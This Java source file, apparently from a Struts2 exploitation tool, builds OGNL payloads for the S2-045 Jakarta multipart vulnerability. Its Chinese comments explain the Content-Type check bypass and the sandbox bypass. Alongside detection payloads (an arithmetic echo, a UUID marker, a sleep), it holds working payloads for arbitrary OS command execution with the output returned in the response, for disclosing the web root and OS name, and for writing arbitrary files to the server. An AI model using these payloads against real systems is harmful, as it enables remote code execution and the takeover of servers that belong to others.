package com.s2tool.core;

import java.net.URLEncoder;
import java.util.UUID;

/**
 * S2-045 OGNL Payload 构造器。
 *
 * <p>基于 S2-045 漏洞原理（Jakarta multipart 解析器将用户可控的 Content-Type
 * 拼入异常消息，异常消息经过 Struts2 国际化文本处理流程被 OGNL 求值），
 * 构造各类利用 Payload。</p>
 *
 * <p><b>沙箱绕过方案</b>：直接替换 OGNL 上下文的 {@code _memberAccess} 为
 * {@code ognl.OgnlContext.DEFAULT_MEMBER_ACCESS}（参考腾讯云《三重沙箱绕过分析》），
 * 之后所有 public 方法调用放行。</p>
 *
 * <p><b>Content-Type 检测绕过</b>：payload 内嵌字面量 {@code 'multipart/form-data'}，
 * 使整个 Content-Type 头值包含该子串，通过 Struts 的 contains 检查。</p>
 */
public final class PayloadBuilder {

    /**
     * Content-Type 伪装字面量：使整个 header 值包含 "multipart/form-data"，
     * 通过 Struts 的 contains 检查，进入 Jakarta 解析器触发漏洞。
     */
    public static final String MIME_FAKE = "(#nike='multipart/form-data').";

    /**
     * 沙箱绕过前缀（参考业内公开 POC，NSE 脚本 / Flyteas / 腾讯云文章同款）：
     * <pre>
     * (#nike='multipart/form-data')                                        // 伪装 Content-Type
     * (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)                        // 获取最高权限
     * (#_memberAccess?(#_memberAccess=#dm):                                // 低版本：直接替换
     *   ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
     *    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
     *    (#ognlUtil.getExcludedPackageNames().clear()).
     *    (#ognlUtil.getExcludedClasses().clear()).
     *    (#context.setMemberAccess(#dm))))                                 // 高版本：清黑名单+替换
     * </pre>
     * <b>注意</b>：实测 Struts2 2.3.30 上精简版（仅 setMemberAccess）无效，
     * 必须使用完整版（OgnlUtil 清黑名单路径）才能绕过沙箱。
     */
    public static final String SANDBOX_BYPASS = MIME_FAKE +
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
          + "(#_memberAccess?(#_memberAccess=#dm):"
          + "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
          + "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
          + "(#ognlUtil.getExcludedPackageNames().clear())."
          + "(#ognlUtil.getExcludedClasses().clear())."
          + "(#context.setMemberAccess(#dm))))";

    /** 公开 POC 数学运算验证算式：88888888-23333+1222 = 88866777 */
    public static final String MATH_EXPR = "88888888-23333+1222";
    /** 上述算式的计算结果（检测特征值） */
    public static final String MATH_RESULT = "88866777";

    private PayloadBuilder() {}

    /**
     * 构造完整的 Content-Type 头值（OGNL 表达式 + multipart 字面量）。
     *
     * @param ognlBody 不含 %{} 包裹的 OGNL 表达式主体
     * @return 可直接作为 Content-Type 头值的字符串
     */
    public static String wrapContentType(String ognlBody) {
        return "%{" + ognlBody + "}";
    }

    /**
     * 数学运算验证 payload（参考业内公开 POC）：
     * OGNL 执行无害算术运算 <code>88888888-23333+1222</code> 并回显，
     * 响应中出现计算结果 <code>88866777</code> 即证明 OGNL 被执行。
     *
     * <p><b>注意</b>：必须调用 close() 刷新 Writer 缓冲，否则输出丢失、
     * 请求会走正常处理流程导致检测失败。</p>
     */
    public static String mathValidationPayload() {
        String body = "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                + "(#o.println(" + MATH_EXPR + ")).(#o.close())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 指纹标记 payload：将随机 UUID 写入响应体，用于高精度判定。
     */
    public static String markerPayload(String uuid) {
        String body = "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                + "(#o.println('" + uuid + "')).(#o.close())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 延时 payload：Thread.sleep 指定毫秒数，用于无回显场景判定。
     */
    public static String sleepPayload(long millis) {
        String body = "(@java.lang.Thread@sleep(" + millis + "))";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 命令执行 payload（ProcessBuilder + 输出流回显）。
     *
     * <p>命令编码策略：优先使用 URL 编码 + URLDecoder 解码，避免单引号/特殊字符
     * 破坏 OGNL 字符串字面量。URLDecoder 为 JDK 内置类，不受沙箱限制。</p>
     *
     * @param command 要执行的系统命令
     * @return Content-Type 头值
     */
    public static String commandPayload(String command) {
        String enc;
        try {
            enc = URLEncoder.encode(command, "UTF-8");
        } catch (java.io.UnsupportedEncodingException e) {
            throw new IllegalStateException("UTF-8 编码不可用", e);
        }
        // #cmd 先解码还原命令原文
        String body = "(#cmd=@java.net.URLDecoder@decode('" + enc + "','UTF-8'))."
                + "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                + "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
                + "(#p=new java.lang.ProcessBuilder(#cmds))."
                + "(#p.redirectErrorStream(true))."
                + "(#process=#p.start())."
                + "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                + "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                + "(#ros.flush())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 获取 Web 根目录 payload：ServletContext.getRealPath("/") 回显到响应体。
     */
    public static String webRootPayload() {
        String body = "(#req=@org.apache.struts2.ServletActionContext@getRequest())."
                + "(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                + "(#resW.println(#req.getSession().getServletContext().getRealPath('/')))."
                + "(#resW.close())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 获取操作系统名称 payload。
     */
    public static String osNamePayload() {
        String body = "(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                + "(#resW.println(@java.lang.System@getProperty('os.name')))."
                + "(#resW.close())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 写文件 payload：Base64 解码后写入目标路径。
     * 使用 JDK 内置 java.util.Base64 解码，内容经 URL 编码避免破坏表达式。
     *
     * @param filePath 目标服务器绝对路径
     * @param base64Data 文件内容的 Base64 编码（无换行）
     */
    public static String writeFilePayload(String filePath, String base64Data) {
        String encPath;
        try {
            encPath = URLEncoder.encode(filePath, "UTF-8");
        } catch (java.io.UnsupportedEncodingException e) {
            throw new IllegalStateException("UTF-8 编码不可用", e);
        }
        String body = "(#wPath=@java.net.URLDecoder@decode('" + encPath + "','UTF-8'))."
                + "(#wData=@java.util.Base64@getDecoder().decode('" + base64Data + "'))."
                + "(#sb=new java.lang.StringBuilder(#wPath))."
                + "(#fileOS=new java.io.FileOutputStream(#sb))."
                + "(#fileOS.write(#wData))."
                + "(#fileOS.close())."
                + "(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
                + "(#resW.println('S2TOOL_WRITE_OK')).(#resW.close())";
        return wrapContentType(SANDBOX_BYPASS + "." + body);
    }

    /**
     * 生成随机 UUID（用于指纹标记）。
     */
    public static String randomUuid() {
        return UUID.randomUUID().toString().replace("-", "");
    }
}
